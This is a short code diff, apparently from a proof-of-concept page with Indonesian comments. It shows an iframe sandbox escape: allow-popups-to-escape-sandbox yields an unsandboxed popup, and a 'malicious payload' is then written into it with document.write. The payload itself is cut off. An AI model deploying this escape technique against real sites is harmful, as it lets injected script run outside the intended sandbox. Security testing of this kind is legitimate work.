@@ -19,7 +19,7 @@
                         
                         // 1. Buka popup kosong (Diizinkan karena allow-popups)
                         // Karena ada allow-popups-to-escape-sandbox, popup ini jadi LIAR (Unsandboxed).
-                        let win = window.open("https://test-iframe-two-kappa.vercel.app/", "_blank"); 
+                        let win = window.open("", "_blank"); 
                         
                         // 2. Suntikkan payload jahat ke dalam popup yang baru terbuka
                         win.document.write(`
